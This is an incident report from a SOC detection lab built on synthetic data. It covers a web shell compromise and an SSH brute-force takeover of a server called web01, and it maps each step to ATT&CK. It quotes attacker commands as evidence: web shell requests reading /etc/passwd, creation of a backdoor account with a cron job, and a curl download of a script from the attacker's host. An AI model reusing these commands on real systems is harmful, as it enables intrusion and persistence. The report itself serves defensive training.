# Incident Report 01: Web Server Compromise and SSH Takeover on web01

**Date of analysis:** 2026-11-02
**Analyst:** Rohith Joginpelly
**Environment:** SOC Detection Lab (synthetic data, no real systems)
**Severity:** Critical
**Confidence:** High for the events (each is in the logs); Medium for whether the two attackers are the same person

## 1. Executive summary

On 1 November 2026, the server `web01` was attacked twice within about 45 minutes. First, an attacker at `198.51.100.77` scanned the website, tried SQL injection, uploaded a malicious PHP file and used it to run commands on the server. Then an attacker at `203.0.113.45` guessed the SSH password of the `deploy` account after 64 failed attempts, logged in, created a hidden new user, set up a scheduled job and downloaded a script from its own server. The server should be treated as fully compromised. I recommend isolating it, preserving evidence, removing both footholds and rebuilding credentials immediately.

## 2. Impact

- **Web application:** an uploaded web shell gave the attacker the ability to run commands as the web server user. `id`, `whoami` and `cat /etc/passwd` were run successfully.
- **SSH and the operating system:** the attacker logged in as `deploy`, an account that can use `sudo` to act as root, and created a new account (`svc_backup`) with a scheduled job.
- **Likely exposure:** the list of system accounts (suspected, see section 5). Database contents may have been exposed through SQL injection, but the logs cannot confirm it.
- **Persistence:** the new account, the scheduled job and a downloaded script mean the attacker could return even after the original access is removed.

## 3. Timeline

Times are as logged on 1 November 2026. The web log records UTC (+0000). The SSH log does not record a time zone, so UTC is assumed.

### Attack A: web compromise (198.51.100.77)

| Time | Event | ATT&CK |
|---|---|---|
| 01:30:01 to 01:30:05 | Nikto scanner probes `/admin`, `/phpmyadmin/`, `/.git/config`, `/backup.zip`, `/wp-login.php`; all return 404 | T1595 Active Scanning |
| 01:30:07 to 01:30:11 | sqlmap sends three injection payloads to `/products.php?id=`; server answers 200 each time | T1190 Exploit Public-Facing Application |
| 01:36:11 | `POST /upload.php` returns 200: a file is uploaded | T1190 |
| 01:36:31 | `GET /uploads/img_0192.php?cmd=id` returns 200: web shell runs a command | T1505.003 Web Shell |
| 01:36:51 | `cmd=whoami` returns 200 | T1059 Command Execution |
| 01:37:11 | `cmd=cat /etc/passwd` returns 200 | T1059, T1087 Account Discovery |

### Attack B: SSH takeover (203.0.113.45)

| Time | Event | ATT&CK |
|---|---|---|
| 02:11:05 | First of 64 failed SSH logins in about 3.5 minutes, trying 7 usernames (root, admin, ubuntu, test, oracle, deploy, postgres) | T1110 Brute Force |
| 02:14:40 | `Accepted password for deploy` from the same IP: the guessing worked | T1078 Valid Accounts |
| 02:15:20 | `sudo useradd -m -s /bin/bash svc_backup`: new account created as root | T1136 Create Account |
| 02:15:35 | `sudo crontab -u svc_backup /tmp/.x`: scheduled job installed for the new account | T1053 Scheduled Task/Job |
| 02:16:05 | `sudo curl http://203.0.113.45:8080/c.sh -o /tmp/.c.sh`: script downloaded to a hidden file | T1105 Ingress Tool Transfer |

## 4. Root cause

Three weaknesses combined:

1. **Unsafe upload and database handling in the web application.** The site accepted SQL injection strings and allowed an upload that could be executed as code.
2. **Password-based SSH with no protection against guessing.** 64 failures in 3.5 minutes did not trigger any lockout, and a weak password for `deploy` was guessed.
3. **Over-privileged account.** `deploy` could run root-level commands through `sudo`, so one stolen password gave the attacker full control.

## 5. Evidence: confirmed and suspected

**Confirmed from the logs**
- A scanner, then SQL injection requests, were sent to the website from `198.51.100.77`.
- A POST to `/upload.php` succeeded, followed by successful requests to `/uploads/img_0192.php?cmd=...`.
- 64 failed SSH logins from `203.0.113.45`, followed by a successful login as `deploy` from the same IP.
- Three privileged commands ran as `deploy`, creating a user, a cron job and downloading `c.sh` from `203.0.113.45:8080`.
- The same IP, `203.0.113.45`, both guessed the password and hosts the downloaded script.

**Suspected but not proven**
- That SQL injection returned database data. All three responses were 200 with the same size (4410 bytes), which does not show data leaving.
- That `/etc/passwd` contents were read. The logs record the request and a 200 status, not the response body. All three command responses show an identical 120-byte size, which is unusual and should be checked against the web server's own response logs.
- What `c.sh` and `/tmp/.x` contain, and whether `c.sh` was run. Their contents are not in the logs.
- Whether the two source IPs belong to the same attacker (see below).

**Are the two attackers the same?**
- Supports "different": different IPs, different tools (Nikto and sqlmap versus SSH guessing), different techniques.
- Supports "related": same server, same night, about 41 minutes apart, and the web shell read the account list about 34 minutes before the SSH guessing began.
- Conclusion: unproven. For safety, I treat them as possibly one attacker with a foothold on the server.

## 6. Containment and eradication (priority order)

1. **Isolate web01 from the network and preserve evidence.** Take a disk snapshot and copy the logs and `img_0192.php` before changing anything.
2. **Cut off attacker access.** Kill any `deploy` sessions, disable the `deploy` account, and block `198.51.100.77` and `203.0.113.45` at the firewall.
3. **Remove persistence.** Delete the `svc_backup` account and its cron job, and remove `/tmp/.x` and `/tmp/.c.sh` after reading them.
4. **Remove the web shell and close the hole.** Delete the uploaded PHP file and restrict uploads to real image types stored where scripts cannot run.
5. **Recover safely.** Reset all passwords and SSH keys, review every account and scheduled job on the server for other changes, and rebuild web01 from a known-good image if the scope cannot be confirmed.

## 7. Recommendations

**Prevent**
- Fix the SQL injection with parameterized queries and validate file uploads.
- Disable SSH password login and use keys only, with multi-factor authentication where possible.
- Add automatic blocking of repeated failed logins (for example, fail2ban).
- Limit `sudo` to the specific commands `deploy` actually needs.
- Place a web application firewall in front of the site.

**Detect**
- Add a rule linking a new account to a scheduled job within minutes (planned in Week 3).
- Add a slow-spray rule for attempts spread over longer windows.
- Forward logs to a central SIEM and correlate web and SSH activity by time and indicator.
- Log response sizes and bodies for the upload path to prove what a web shell returned.

## 8. Lessons learned

- **What worked:** the lab's six rules flagged both intrusions, and the post-login sudo commands exposed the persistence.
- **What was missed or unclear:** the logs cannot prove what the attacker read or whether the downloaded script ran, and a slower brute force would have evaded the 10-minute rule.
- **What I learned:** log details must be copied exactly, status codes need to be read precisely (200 means success, 404 means not found), and "confirmed" must be kept separate from "suspected" in any report.

## Appendix: commands used

```bash
grep "Failed password" sample_logs/auth.log | grep -c "203.0.113.45"
grep "Accepted" sample_logs/auth.log | grep "203.0.113.45"
grep -E "^Nov  1 02:1[4-9]" sample_logs/auth.log | grep -v "Failed"
grep "198.51.100.77" sample_logs/web_access.log
grep "198.51.100.77" sample_logs/web_access.log | grep "cmd="
python3 detect.py
```
